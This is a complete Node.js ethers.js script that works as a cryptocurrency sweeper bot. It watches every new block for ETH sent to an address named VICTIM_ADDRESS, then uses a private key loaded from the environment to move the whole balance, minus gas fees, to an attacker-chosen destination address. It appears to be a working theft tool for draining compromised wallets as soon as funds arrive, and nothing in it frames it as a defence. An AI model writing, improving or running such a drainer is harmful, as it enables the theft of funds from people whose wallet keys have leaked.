import "dotenv/config";
import { ethers } from "ethers";

let provider;
let wallet;

const TARGET = process.env.VICTIM_ADDRESS.toLowerCase();
const DESTINATION = process.env.TO_ADDRESS.toLowerCase();

async function init() {
  provider = new ethers.providers.WebSocketProvider(process.env.RPC_WS);
  wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const initBalance = await wallet.getBalance();
  console.log("✅ Websocket Connected. Listeninng for ETH to: ", TARGET);
  console.log("💳 Value : ", ethers.utils.formatEther(initBalance), "ETH");

  provider.on("block", async (blockNumber) => {
    console.log("📦 Block :", blockNumber);

    try {
      const block = await provider.getBlockWithTransactions(blockNumber);
      for (const tx of block.transactions) {
        if (!tx.to) continue;

        const to = tx.to.toLowerCase();
        const value = tx.value;

        if (to == TARGET && value.gt(0)) {
          console.log("💸 ETH just in to target");
          console.log("🔹 Tx Hash: ", tx.hash);
          console.log("🔹 Value: ", ethers.utils.formatEther(value), "ETH");

          setTimeout(async () => {
            try {
              const gasLimit = ethers.BigNumber.from(21000);
              const gasPrice = await provider.getGasPrice();
              const estimatedFee = gasPrice.mul(gasLimit);
              const balance = await wallet.getBalance();
              const safeMargin = ethers.utils.parseUnits("0.00001", "ether");
              const totalFeeWithMargin = estimatedFee.add(safeMargin);

              if (balance.lte(totalFeeWithMargin)) {
                console.log("❌ Not enough balance after fee + margin");
                return;
              }

              const amountToSend = balance.sub(totalFeeWithMargin);

              const txSend = await wallet.sendTransaction({
                to: DESTINATION,
                value: amountToSend,
                gasLimit,
                gasPrice,
              });

              console.log("🚀 Sweep has been sent ! TX:", txSend.hash);
            } catch (error) {
              console.error("❌ Failed to send ETH:", error.message);
            }
          }, 5000);
        }
      }
    } catch (error) {
      console.error("❌ Failed to get Block:", error.message);
    }
  });
}

init();
